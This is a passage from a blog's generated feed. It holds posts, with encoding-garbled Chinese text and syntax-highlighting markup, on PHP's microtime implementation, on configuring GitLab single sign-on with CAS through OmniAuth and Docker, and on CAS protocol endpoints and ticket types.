class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ext/standard/microtime.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åŸå‹</span></span><br><span class="line">PHP_FUNCTION(microtime)</span><br><span class="line">&#123;</span><br><span class="line">_php_gettimeofday(INTERNAL_FUNCTION_PARAM_PASSTHRU, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _php_gettimeofday(INTERNAL_FUNCTION_PARAMETERS, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">zend_bool get_as_float = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tp</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">Z_PARAM_OPTIONAL</span><br><span class="line">Z_PARAM_BOOL(get_as_float)</span><br><span class="line">ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (gettimeofday(&amp;tp, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//microtimeå‚æ•°ä¸ºtrue</span></span><br><span class="line"><span class="keyword">if</span> (get_as_float) &#123;</span><br><span class="line">RETURN_DOUBLE((<span class="keyword">double</span>)(tp.tv_sec + tp.tv_usec / MICRO_IN_SEC));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode) &#123;</span><br><span class="line"><span class="comment">//çœç•¥...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">RETURN_NEW_STR(zend_strpprintf(<span class="number">0</span>, <span class="string">&quot;%.8F %ld&quot;</span>, tp.tv_usec / MICRO_IN_SEC, (<span class="keyword">long</span>)tp.tv_sec));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>gettimeofdayå‡½æ•°å¯¹æ¯”å®ç°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># demo.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">microtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">gettimeofday(&amp;tv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> php_time;</span><br><span class="line"><span class="comment">//PHPæ—¶é—´æ ¼å¼</span></span><br><span class="line">php_time = (<span class="keyword">double</span>)(tv.tv_sec + tv.tv_usec / <span class="number">1000000.00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tv_sec: %ld, tv_usec: %d, php_time: %f\n&quot;</span>, tv.tv_sec, tv.tv_usec, php_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">microtime();</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡äº†è§£microtimeå‡½æ•°çš„å®ç°ï¼Œå…¶å®å¯ä»¥å‘ç°PHPå˜é‡ç±»å‹doubleä¼šè‡ªåŠ¨çœç•¥å°æ•°åé¢çš„0</p><ul><li>ç¤ºä¾‹ä»£ç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = (<span class="keyword">double</span>) <span class="number">1.2000</span>;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>);  <span class="comment">//è¾“å‡º: float(1.2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å®RETURN-DOUBLE"><a href="#å®RETURN-DOUBLE" class="headerlink" title="#å®RETURN_DOUBLE"></a>#å®RETURN_DOUBLE</h2><p>è¿™é‡Œä¸»è¦äº†è§£ä¸‹PHPæºç ä¸­å‡½æ•°è¿”å›å€¼å¤§éƒ½é‡‡ç”¨å®å‡½æ•°çš„å½¢å¼è¿”å›ï¼Œå¦‚RETURN_DOUBLEç­‰ï¼Œå…·ä½“å®ç°åœ¨zend_API.hå’Œzend_types.hæ–‡ä»¶ä¸­ã€‚</p><ul><li>ç®€æ</li></ul><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¾…å®š...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> microtime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlabé…ç½®CASè®¤è¯</title>
      <link href="2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/"/>
      <url>2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>Gitlabé‡‡ç”¨Omniauthæ¡†æ¶æ”¯æŒå¤šç§è®¤è¯æ–¹å¼, åœ¨å¼€å‘SSOç³»ç»Ÿè¿‡ç¨‹ä¸­ç¬”è€…é‡‡ç”¨CASè®¤è¯çš„æ–¹å¼æ‰“é€šGitlabç³»ç»Ÿä¸SSO. é‡‡ç”¨CASåè®®è®¤è¯éœ€è¦äº†è§£CASåè®®äº¤äº’è¿‡ç¨‹åŠæ¥å£å¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œå¯å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« <a href="https://ushell.me/2019/05/25/CAS%E5%8D%8F%E8%AE%AE/">CASåè®®</a></p><h2 id="Gitlabé…ç½®"><a href="#Gitlabé…ç½®" class="headerlink" title="#Gitlabé…ç½®"></a>#Gitlabé…ç½®</h2><ul><li>ç¼–è¾‘Gitlabé…ç½®æ–‡ä»¶(/etc/gitlab/gitlab.rb)</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### OmniAuth Settings</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_enabled&#x27;</span>] = <span class="literal">true</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_allow_single_sign_on&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_email_from_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_from_provider&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_attributes&#x27;</span>] = [<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_auto_sign_in_with_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_block_auto_created_users&#x27;</span>] = <span class="literal">false</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_external_providers&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_providers&#x27;</span>] = [</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;cas3&quot;</span>, <span class="comment">#ä½¿ç”¨CAS3åè®®</span></span><br><span class="line">     <span class="string">&quot;label&quot;</span>=&gt; <span class="string">&quot;SSO&quot;</span>,  <span class="comment">#Gitlabç™»é™†é¡µé¢æ˜¾ç¤ºè®¤è¯åç§°</span></span><br><span class="line">     <span class="string">&quot;args&quot;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span> =&gt; <span class="string">&quot;http://192.168.0.2:8080&quot;</span>, <span class="comment">#SSOåœ°å€</span></span><br><span class="line">        <span class="string">&quot;login_url&quot;</span> =&gt; <span class="string">&quot;/login&quot;</span>, <span class="comment">#SSOç™»é™†åœ°å€</span></span><br><span class="line">        <span class="string">&quot;service_validate_url&quot;</span> =&gt; <span class="string">&quot;/verify&quot;</span>, <span class="comment">#SSOæˆæƒæ¥å£</span></span><br><span class="line">        <span class="string">&quot;logout_url&quot;</span> =&gt; <span class="string">&quot;/logout&quot;</span> <span class="comment">#SSOé€€å‡ºæ¥å£</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>é‡åŠ è½½é…ç½®æ–‡ä»¶</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#gitlab-ctl reconfigure</span></span><br></pre></td></tr></table></figure><ul><li>é‡å¯æœåŠ¡</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#gitlab-ctl restart</span></span><br></pre></td></tr></table></figure><h2 id="Gitlab-Dockeré…ç½®"><a href="#Gitlab-Dockeré…ç½®" class="headerlink" title="#Gitlab Dockeré…ç½®"></a>#Gitlab Dockeré…ç½®</h2><p>è¿™é‡Œæ¨èä½¿ç”¨dockeræ­å»ºgitlabæœåŠ¡ä¾¿äºæµ‹è¯•</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#gitlab.yml</span><br><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line">    gitlab:</span><br><span class="line">      image: <span class="string">&#x27;gitlab/gitlab-ce&#x27;</span></span><br><span class="line">      restart: always</span><br><span class="line">      container_name: gitlab</span><br><span class="line">      environment:</span><br><span class="line">        <span class="symbol">TZ</span>: <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">        <span class="symbol">GITLAB_OMNIBUS_CONFIG</span>: |</span><br><span class="line">          #external_url <span class="string">&#x27;http://gitlab.example.com&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_enabled&#x27;</span>] = true</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_allow_single_sign_on&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_email_from_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_from_provider&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_attributes&#x27;</span>] = [<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_auto_sign_in_with_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_block_auto_created_users&#x27;</span>] = false</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_external_providers&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_providers&#x27;</span>] = [&#123;<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;cas3&quot;</span>,<span class="string">&quot;label&quot;</span>=&gt; <span class="string">&quot;SSO&quot;</span>,<span class="string">&quot;args&quot;</span> =&gt; &#123;<span class="string">&quot;url&quot;</span> =&gt; <span class="string">&quot;http://192.168.0.2:8080&quot;</span>,<span class="string">&quot;login_url&quot;</span> =&gt; <span class="string">&quot;/login&quot;</span>,<span class="string">&quot;service_validate_url&quot;</span> =&gt; <span class="string">&quot;/verify&quot;</span>,<span class="string">&quot;logout_url&quot;</span> =&gt; <span class="string">&quot;/logout&quot;</span>&#125;&#125;]</span><br><span class="line">      ports:</span><br><span class="line">        - <span class="string">&quot;80:80&quot;</span></span><br><span class="line">        - <span class="string">&quot;443:443&quot;</span></span><br><span class="line">        - <span class="string">&quot;10022:22&quot;</span></span><br><span class="line">      volumes:</span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/config:/etc/gitlab&#x27;</span></span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/logs:/var/log/gitlab&#x27;</span></span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/data:/var/opt/gitlab&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><ol><li>[gitlab dockerç¯å¢ƒå˜é‡] <a href="https://docs.gitlab.com/omnibus/settings/environment-variables.html">https://docs.gitlab.com/omnibus/settings/environment-variables.html</a></li><li>[gitlabæ”¯æŒCASè®¤è¯]  <a href="https://gitlab.com/help/integration/cas.md">https://gitlab.com/help/integration/cas.md</a></li><li>[gitlabè®¤è¯ç»„ä»¶omniauth] <a href="https://docs.gitlab.com/ce/integration/omniauth.html">https://docs.gitlab.com/ce/integration/omniauth.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> gitlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cas </tag>
            
            <tag> sso </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CASåè®®</title>
      <link href="2019/05/25/CAS%E5%8D%8F%E8%AE%AE/"/>
      <url>2019/05/25/CAS%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>CASå…¨ç§°æ˜¯ä¸­å¿ƒè®¤è¯æœåŠ¡(Central Authentication Service), æ˜¯SSOæœåŠ¡ä¸­ä¸€ç§è®¤è¯åè®®, ç›®å‰æœ‰ä¸‰ä¸ªç‰ˆæœ¬1.0, 2.0, 3.0</p><h2 id="CASè®¤è¯æµç¨‹"><a href="#CASè®¤è¯æµç¨‹" class="headerlink" title="#CASè®¤è¯æµç¨‹"></a>#CASè®¤è¯æµç¨‹</h2><ul><li>è®¤è¯è¿‡ç¨‹<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç•¥... <span class="selector-pseudo">:)</span></span><br></pre></td></tr></table></figure></li><li>å¦‚å›¾æ‰€ç¤º<br><img src="/images/cas-protocol.png" class="lazyload" data-srcset="/images/cas-protocol.png" srcset="data:image/png;base64,666"></li></ul><h2 id="CASåè®®è®¤è¯æ¥å£URI"><a href="#CASåè®®è®¤è¯æ¥å£URI" class="headerlink" title="#CASåè®®è®¤è¯æ¥å£URI"></a>#CASåè®®è®¤è¯æ¥å£URI</h2><ul><li>æ¥å£åˆ—è¡¨</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. /loginæ¥å£</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>. /logoutæ¥å£</span><br><span class="line"></span><br><span class="line"><span class="attribute">3</span>. /validateæ¥å£ Ticketè®¤è¯æ¥å£ (v<span class="number">1</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">4</span>. /serviceValidateæ¥å£ Ticketè®¤è¯æ¥å£ (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span>. /proxyValidateæ¥å£ Ticketè®¤è¯/ä»£ç†æ¥å£ (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">6</span>. /proxyæ¥å£ ä»£ç†æœåŠ¡æ¥å£ (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>. /p<span class="number">3</span>/serviceValidateæ¥å£ Ticketè®¤è¯æ¥å£ï¼ˆv<span class="number">3</span>.<span class="number">0</span>ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="attribute">8</span>. /p<span class="number">3</span>/proxyValidateæ¥å£ Ticketè®¤è¯/ä»£ç†æ¥å£ (v<span class="number">3</span>.<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>æ¥å£æ•°æ®ç»“æ„</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#loginæ¥å£</span><br><span class="line">è¯·æ±‚å‚æ•°: </span><br><span class="line"> service=http://<span class="number">686617</span>c54d47/users/auth/cas3/callback?url=http://<span class="number">127.0</span>.<span class="number">0.1</span>/users/sign_in</span><br><span class="line"></span><br><span class="line"> é€‰å¡«å‚æ•°:</span><br><span class="line"> renew=</span><br><span class="line"> gateway=</span><br><span class="line"> method=</span><br><span class="line"></span><br><span class="line">å“åº”å‚æ•°:</span><br><span class="line"> è®¤è¯æˆåŠŸ: <span class="number">302</span>è·³è½¬åˆ°serviceåœ°å€, é™„å¸¦ticketè®¤è¯æˆåŠŸå‚æ•°</span><br><span class="line"> è®¤è¯å¤±è´¥: SSOç™»é™†é¡µé¢æç¤ºé”™è¯¯ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#logoutæ¥å£</span><br><span class="line">v1.<span class="number">0</span>,v2.<span class="number">0</span>ç‰ˆæœ¬:</span><br><span class="line"> è´¦æˆ·é€€å‡ºæˆåŠŸåæ˜¾ç¤ºæˆåŠŸä¿¡æ¯çš„é¡µé¢</span><br><span class="line"></span><br><span class="line">v3.<span class="number">0</span>ç‰ˆæœ¬:</span><br><span class="line"> è¯·æ±‚å‚æ•°ä¸­ä¸å¸¦service, æ˜¾ç¤ºé€€å‡ºæˆåŠŸé¡µé¢ï¼›å‚æ•°ä¸­å¸¦æœ‰serviceï¼Œé€€å‡ºæˆåŠŸåè·³è½¬åˆ°serviceé¡µé¢</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#validateæ¥å£ (ä¸æ¨èä½¿ç”¨)</span><br><span class="line">è¯·æ±‚å‚æ•°:</span><br><span class="line"> service:</span><br><span class="line"> ticke<span class="variable">t:</span> (loginæ—¶è®¤è¯çš„Ticket)</span><br><span class="line"> renew(é€‰å¡«)</span><br><span class="line"></span><br><span class="line">å“åº”å‚æ•°:</span><br><span class="line"> è®¤è¯æˆåŠŸ: yes<span class="symbol">&lt;LF&gt;</span></span><br><span class="line"> è®¤è¯å¤±è´¥: <span class="keyword">no</span><span class="symbol">&lt;LF&gt;</span></span><br><span class="line"></span><br><span class="line">#serviceValidateæ¥å£</span><br><span class="line">è¯·æ±‚å‚æ•°:</span><br><span class="line"> service:</span><br><span class="line"> ticke<span class="variable">t:</span> (loginæ—¶è®¤è¯çš„Ticket)</span><br><span class="line"> pgtUr<span class="variable">l:</span> (ä»£ç†url, é€‰å¡«)</span><br><span class="line"> rene<span class="variable">w:</span> (é€‰å¡«)</span><br><span class="line"> forma<span class="variable">t:</span> (æœŸå¾…å“åº”ç»“æœæ ¼å¼:xmlæˆ–json, Gitlabé»˜è®¤ä½¿ç”¨XML)</span><br><span class="line"></span><br><span class="line">å“åº”å‚æ•°:</span><br><span class="line"> è®¤è¯æˆåŠŸ(xmlæ ¼å¼):</span><br><span class="line">  &lt;<span class="keyword">ca</span><span class="variable">s:serviceResponse</span> xmln<span class="variable">s:cas</span>=<span class="string">&quot;http://www.yale.edu/tp/cas&quot;</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">ca</span><span class="variable">s:authenticationSuccess</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:user</span>&gt;ä¸šåŠ¡å‚æ•°&lt;/<span class="keyword">ca</span><span class="variable">s:user</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:attributes</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">ca</span><span class="variable">s:firstname</span>&gt;ä¸šåŠ¡å‚æ•°&lt;/<span class="keyword">ca</span><span class="variable">s:firstname</span>&gt;</span><br><span class="line">       &lt;/<span class="keyword">ca</span><span class="variable">s:attributes</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:proxyGrantingTicket</span>&gt;æ–°ç”Ÿæˆçš„Ticket&lt;/<span class="keyword">ca</span><span class="variable">s:proxyGrantingTicket</span>&gt;</span><br><span class="line">   &lt;/<span class="keyword">ca</span><span class="variable">s:authenticationSuccess</span>&gt;</span><br><span class="line">  &lt;/<span class="keyword">ca</span><span class="variable">s:serviceResponse</span>&gt;</span><br><span class="line"></span><br><span class="line"> è®¤è¯å¤±è´¥(xmlæ ¼å¼):</span><br><span class="line">  &lt;<span class="keyword">ca</span><span class="variable">s:serviceResponse</span> xmln<span class="variable">s:cas</span>=<span class="string">&quot;http://www.yale.edu/tp/cas&quot;</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">ca</span><span class="variable">s:authenticationFailure</span> code=<span class="string">&quot;INVALID_TICKET&quot;</span>&gt;</span><br><span class="line">      é”™è¯¯ä¿¡æ¯</span><br><span class="line">    &lt;/<span class="keyword">ca</span><span class="variable">s:authenticationFailure</span>&gt;</span><br><span class="line">  &lt;/<span class="keyword">ca</span><span class="variable">s:serviceResponse</span>&gt;</span><br><span class="line"></span><br><span class="line">è®¤è¯å¤±è´¥ç›¸å…³çš„é”™è¯¯ç :</span><br><span class="line">  INVALID_REQUEST | INVALID_TICKET_SPEC | INVALID_TICKET | INVALID_SERVICE | INTERNAL_ERROR     </span><br></pre></td></tr></table></figure><h2 id="Ticketèº«ä»½ç¥¨æ®"><a href="#Ticketèº«ä»½ç¥¨æ®" class="headerlink" title="#Ticketèº«ä»½ç¥¨æ®"></a>#Ticketèº«ä»½ç¥¨æ®</h2><p>ticketæ˜¯è®¤è¯å‘¨æœŸä¸­èº«ä»½å‡­è¯ï¼Œticketå­—ç¬¦ä»…åŒ…å«{A-Z, a-z, 0-9}å’Œâ€-â€œ, å­—ç¬¦é•¿åº¦æœ€å¥½å¤§äº64ä½</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">serviceç±»å‹Ticket: </span><br><span class="line"><span class="bullet">  1.</span> ç”¨äºæ ¡éªŒlogin serviceå‚æ•°ä¸­çš„åœ°å€</span><br><span class="line"><span class="bullet">  2.</span> Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;ST-&quot;å¼€å¤´</span><br><span class="line"><span class="bullet">  3.</span> TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§</span><br><span class="line"></span><br><span class="line"> proxyç±»å‹Ticket:</span><br><span class="line"><span class="bullet">  1.</span> ç”¨äºæ ¡éªŒproxy serviceå‚æ•°ä¸­çš„åœ°å€</span><br><span class="line"><span class="bullet">  2.</span> Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;PT-&quot;å¼€å¤´</span><br><span class="line"><span class="bullet">  3.</span> TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§</span><br><span class="line"></span><br><span class="line"> proxy-grantç±»å‹Ticket:</span><br><span class="line"><span class="bullet">  1.</span> å¤šçº§åˆ«proxyä»£ç†ä¸­ä½¿ç”¨ï¼Œéä¸€æ¬¡æ€§ticket</span><br><span class="line"><span class="bullet">  2.</span> Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;PGT-&quot;å¼€å¤´</span><br><span class="line"><span class="bullet">  3.</span> TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§</span><br><span class="line"></span><br><span 